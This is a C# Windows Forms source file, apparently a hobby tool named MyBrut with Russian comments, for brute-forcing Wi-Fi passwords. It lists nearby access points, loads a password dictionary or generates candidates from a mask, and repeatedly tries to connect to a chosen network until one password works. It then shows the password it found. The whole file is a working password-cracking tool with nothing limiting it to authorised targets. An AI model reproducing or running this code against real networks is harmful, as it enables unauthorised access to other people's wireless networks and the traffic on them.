using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SimpleWifi;
using SimpleWifi.Win32;
using System.Threading;
using System.Net.NetworkInformation;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;

namespace MyBrut
{
    public partial class MainForm : Form
    {
        private static Wifi wifi;
        string connectionString;
        Thread t;
        IEnumerable<AccessPoint> accessPoints;
        bool stopBrut = false;

        StreamReader sr;
        string[] passwords={};


        /// <summary>
        /// Главная форма
        /// </summary>
        public MainForm()
        {
            InitializeComponent();

            // Считывание паролей
            try
            {
                sr = new StreamReader("pass.txt");
                passwords = sr.ReadToEnd().Split('\n');
                sr.Close();
                labelViewPassInDict.Text = passwords.Length.ToString();
                labelShowUsed.Text = "0";
                labelShowUnUsedPasswords.Text = "0";
                showRichTextBox2.Text += "-> Загрузка паролей прошла успешно\n";
                showRichTextBox2.Text += "-> Количество паролей = " + passwords.Length + "\n";

            }
            catch
            {
            }
            
            // инициализация вай-фай объекта
            try
            {
                wifi = new Wifi();
                wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
                if (wifi.NoWifiAvailable)
                    showRichTextBox2.Text += "\r\n-- Не найдено активных Wi-Fi точек --\n";

            }
            catch(Exception er)
            {
                MessageBox.Show(er.Message);

                SetLabelsToZeroState();
                // Обновить список сетей
                ReShow(null, null);  
            }

                      
        }

        /// <summary>
        /// Рассоединение
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Disconnect(object sender, EventArgs e)
        {
            wifi.Disconnect();
            showRichTextBox2.Text += "-> Ты отключен от Wi-Fi\n";
        }

        /// <summary>
        /// Статус соединения
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Status(object sender, EventArgs e)
        {
            showRichTextBox2.Text += "\r\n-- Статус соединения --\n";
            if (wifi.ConnectionStatus == WifiStatus.Connected)
                showRichTextBox2.Text += "-> Подключен к Wi-Fi точке\n";
            else
                showRichTextBox2.Text += "-> Отсутствует подключение к Wi-Fi точке\n";
        }

        /// <summary>
        /// Соединение
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Connect(object sender, EventArgs e)
        {
            if (listNet.SelectedIndices.Count == 1)
            {
                int number = listNet.SelectedIndices[0];
                AccessPoint selectedAP = accessPoints.ToList()[number];

                SubForm subForm = new SubForm(selectedAP, ref showRichTextBox2);
                subForm.Show();
            }
        }

        /// <summary>
        /// Перепоказать список точек
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReShow(object sender, EventArgs e)
        {
            accessPoints = List();
            listNet.Items.Clear();
            foreach (AccessPoint ap in accessPoints)
            {
                //ну и добавляем скомпoнованый элемент непосредственно в листвью
                listNet.Items.Add(ap.ShowActive());
            }
            showRichTextBox2.Text += "-> Обновлено\n";
            showRichTextBox2.Text += connectionString;
        }

        /// <summary>
        /// Список точек
        /// </summary>
        /// <returns></returns>
        private IEnumerable<AccessPoint> List()
        {
            IEnumerable<AccessPoint> accessPointsList = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);

            return accessPointsList;
        }

        /// <summary>
        /// Профиль соединения
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void ProfileXML(object sender, EventArgs e)
        {
            if (listNet.SelectedIndices.Count == 1)
            {
                int number = listNet.SelectedIndices[0];

                AccessPoint selectedAP = accessPoints.ToList()[number];
                string p=selectedAP.GetProfileXML().ToString();
                string profile = string.IsNullOrWhiteSpace(p) ? "-> Отсутствует профиль к данной сети" : p;


                showRichTextBox2.Text += string.Format("\r\n{0}\r\n", selectedAP.Name+":\n"+profile);
            }
        }

        /// <summary>
        /// Удаление профиля соединения
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void DeleteProfile(object sender, EventArgs e)
        {
            if (listNet.SelectedIndices.Count == 1)
            {
                int number = listNet.SelectedIndices[0];

                AccessPoint selectedAP = accessPoints.ToList()[number];

                selectedAP.DeleteProfile();
                showRichTextBox2.Text += string.Format("\r\n-> Удален профиль для точки: {0}\r\n", selectedAP.Name);
            }
        }

        /// <summary>
        /// Новый статус соединения
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
        {
            connectionString = string.Format("\n-> Новый статус: {0}", e.NewStatus.ToString());
        }

        /// <summary>
        /// Очистка окна логгирования
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClearLog_Click(object sender, EventArgs e)
        {
            showRichTextBox2.Clear();
            stopBrut = false;
            ChangeButtonBrut("Начать перебор паролей к сети");
        }

        /// <summary>
        /// Кнопка Брута
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ButtonBrutClick(object sender, EventArgs e)
        {
            if(passwords.Length>0)
            {
                t = new Thread(GetBrut);
                t.IsBackground = true ;
                if (!stopBrut)
                {
                    if (listNet.SelectedIndices.Count == 1)
                    {
                        int number = listNet.SelectedIndices[0];
                        AccessPoint selectedAP = accessPoints.ToList()[number];
                        labelNameOfNetwork.Text = selectedAP.Name;
                        t.Start(selectedAP);

                        ChangeButtonBrut("Остановить перебор");
                        stopBrut = true;
                    }
                    else
                    {
                        labelNameOfNetwork.Text = "<cеть не выбрана>";
                        ChangeShowRichTextBox2("-> Сеть не выбрана");
                    }
                }
                else
                {
                    labelNameOfNetwork.Text = "";
                    t.Abort();

                    ButtonBrut.Enabled = true;
                    stopBrut = false;
                    ChangeButtonBrut("Начать перебор паролей к сети");
                    SetLabelsToZeroState();
                }
            }
            else
            {
                ChangeShowRichTextBox2("-> Пароли не выбраны\n");
            }
        }

        /// <summary>
        ///  Предусмотрен брут только тех точек, которые требуют только пароль
        /// </summary>
        public void GetBrut(object ap)
        {
            AccessPoint selectedAP = (AccessPoint)ap;
            var authRequest = new AuthRequest(selectedAP);
            if (authRequest.IsDomainSupported || authRequest.IsUsernameRequired)
            {
                ChangeShowRichTextBox2("  Соединение требует не только пароль, но и логин пользователя/домен\n");
                stopBrut = true;
                return;
            }
            if (authRequest.IsPasswordRequired)
            {
                for (int i = 0; i < passwords.Length && !stopBrut; i++)
                {
                    bool overwrite = true;
                    string pass = passwords[i];


                    // Требуется ли пароль
                    if (overwrite)
                    {
                        bool validPassFormat = false;

                        validPassFormat = selectedAP.IsValidPassword(pass);

                        if (!validPassFormat)
                        {
                            ChangeShowRichTextBox2("-> Невалидный пароль:" + pass + "\r\n");
                            continue;
                        }
                        else
                        {
                            authRequest.Password = pass;

                            bool success = selectedAP.Connect(authRequest, overwrite);
                            if (success)
                            {
                                stopBrut = true;
                                ChangeShowRichTextBox2("  Соединение удалось, пароль: " + pass);
                                ChangeButtonBrut("Начать перебор паролей к сети",true);
                                return;
                            }
                            else
                            {
                                ChangeShowRichTextBox2 (i + "  Соединение не удалось по паролю: " + pass);
                            }
                        }
                    }

                    ChangeLabelUsedPasses((i + 1).ToString());
                    ChangeLabelUnUsedPasses((passwords.Length - i - 1).ToString());
                }
            }
            else
            {
                ChangeShowRichTextBox2("  Соединение свободно, пароль не требуется\n");
                ChangeButtonBrut("Начать перебор паролей к сети");
                
                t.Abort();
                stopBrut = true;
                return;
            }
            t.Abort();
            stopBrut = true;
            ChangeButtonBrut("Начать перебор паролей к сети");
            ChangeShowRichTextBox2(string.Format("\n  Пароль не найден"));
        }

        

        /// <summary>
        /// Кнопка получения паролей из файлы
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void GetPasswordsButton_Click(object sender, EventArgs e)
        {
            // Прочитаем пароли
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                ofd.ShowDialog();
                string ofdFile = ofd.FileName;
                sr = new StreamReader(ofdFile);
                passwords = sr.ReadToEnd().Split('\n');
                sr.Close();
                SetLabelsToZeroState();
                showRichTextBox2.Text += "-> Загрузка паролей прошла успешно\n";
                showRichTextBox2.Text += "-> Количество паролей = " + passwords.Length + "\n";
                
            }
            catch(Exception er)
            {
                MessageBox.Show(er.Message);
                showRichTextBox2.Text += "-> " + er.Message + "\n";
            }
        }

        public void SetLabelsToZeroState()
        {
            labelViewPassInDict.Text = passwords.Length.ToString();
                labelShowUsed.Text = "0";
                labelShowUnUsedPasswords.Text = "0";
        }
        delegate void text(string text, bool?enabled = true);
        /// <summary>
        /// Изменение richTextBox'a
        /// </summary>
        /// <param name="text"></param>
        public void ChangeShowRichTextBox2(string text, bool? enabled = null)
        {
            if (showRichTextBox2.InvokeRequired)
            {
                showRichTextBox2.Invoke(new text(ChangeShowRichTextBox2), text, enabled);
            }
            else
            {
                showRichTextBox2.Text += (text);
            }
        }

        /// <summary>
        /// Изменение текста кнопки
        /// </summary>
        /// <param name="text"></param>
        public void ChangeButtonBrut(string text, bool? enabled=null)
        {
            if (ButtonBrut.InvokeRequired)
            {
                ButtonBrut.Invoke(new text(ChangeButtonBrut), text, enabled);
            }
            else
            {
                ButtonBrut.Text = (text);
                if (enabled != null)
                    ButtonBrut.Enabled = (bool)enabled;
            }
        }

        /// <summary>
        /// Изменение количества неиспользованных паролей
        /// </summary>
        /// <param name="text"></param>
        public void ChangeLabelUnUsedPasses(string text, bool? enabled = null)
        {
            if (labelShowUnUsedPasswords.InvokeRequired)
            {
                labelShowUnUsedPasswords.Invoke(new text(ChangeLabelUnUsedPasses), text, enabled);
            }
            else
            {
                labelShowUnUsedPasswords.Text = (text);
            }
        }

        /// <summary>
        /// Изменение количества использованных паролей
        /// </summary>
        /// <param name="text"></param>
        public void ChangeLabelUsedPasses(string text, bool? enabled = null)
        {
            if (labelShowUsed.InvokeRequired)
            {
                labelShowUsed.Invoke(new text(ChangeLabelUsedPasses), text, enabled);
            }
            else
            {
                labelShowUsed.Text = (text);
            }
        }

        /// <summary>
        /// Автопрокрутка
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void showRichTextBox2_TextChanged(object sender, EventArgs e)
        {
            showRichTextBox2.SelectionStart = showRichTextBox2.Text.Length;
            showRichTextBox2.ScrollToCaret();
        }


        /// <summary>
        /// Рекурсивная функция перебора
        /// </summary>
        List<string> p = new List<string>();
        List<string> resultList = new List<string>();
        void P(StringBuilder result, int maxCount, int maxLength, int minLength)
        {
            // Вызываем рекурсию, пока длина не удовлетворяет условию перебора всех возможных комбинаций
            if (maxCount > 0)
            {
                foreach (var part in p)
                {
                    StringBuilder res = new StringBuilder(result + part);

                    // Условие длины - накладывается на рекурсию
                    
                        P(res, maxCount - 1, maxLength, minLength);
                }
            }
            else
            {
                foreach (var part in p)
                {
                    string res = result + part;
                    // Если в рамках фильтра - то добавляем возможный вароль
                    if (res.Length >= minLength && res.Length <= maxLength)
                        resultList.Add(res);
                }
                return;
            }
        }

        // Генерируем пароли
        private void GenerateButton_Click(object sender, EventArgs e)
        {
            try
            {
                foreach(var m in textBoxOfMask.Text.Split(','))
                {
                    p.Add(m);
                }
                int maxLength = int.Parse(textBoxMaxLength.Text);
                int minLength = int.Parse(textBoxMinLength.Text);
                int count = p.Count;

                // Запуск рекурсии
                P(new StringBuilder(""), count, maxLength, minLength);
                
                ChangeShowRichTextBox2("\n-> Сгенерированные пароли в памяти:");
                passwords = resultList.ToArray();
                foreach (var res in resultList)
                {
                    ChangeShowRichTextBox2("\n"+res);
                }
                SetLabelsToZeroState();
                p.Clear();
                resultList.Clear();
            }
            catch (Exception er)
            {
                MessageBox.Show(er.Message);
            } 
        }
    }
}
